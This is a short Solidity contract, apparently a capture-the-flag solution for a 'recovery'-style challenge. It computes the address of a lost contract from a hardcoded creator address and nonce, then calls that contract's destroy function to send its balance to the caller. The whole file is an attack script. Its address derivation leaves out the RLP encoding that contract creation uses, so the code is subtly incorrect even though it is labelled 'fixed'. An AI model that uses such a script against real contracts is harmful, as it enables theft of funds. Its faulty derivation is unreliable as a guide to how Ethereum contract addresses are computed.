pragma solidity ^0.8.0;

contract FixedAttack {
    address public targetToken;
    address immutable private recovery = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    uint8 private nonce = 1;

    constructor() {
        targetToken = computeAddress(recovery, nonce);
    }

    function computeAddress(address a, uint8 n) private pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes20(a), n));
        return address(uint160(uint256(hash)));
    }

    function destroyIt() public {
        (bool success, ) = targetToken.call(abi.encodeWithSelector(0x87335b7a, payable(msg.sender)));
        require(success, "Destroy failed");
    }
}
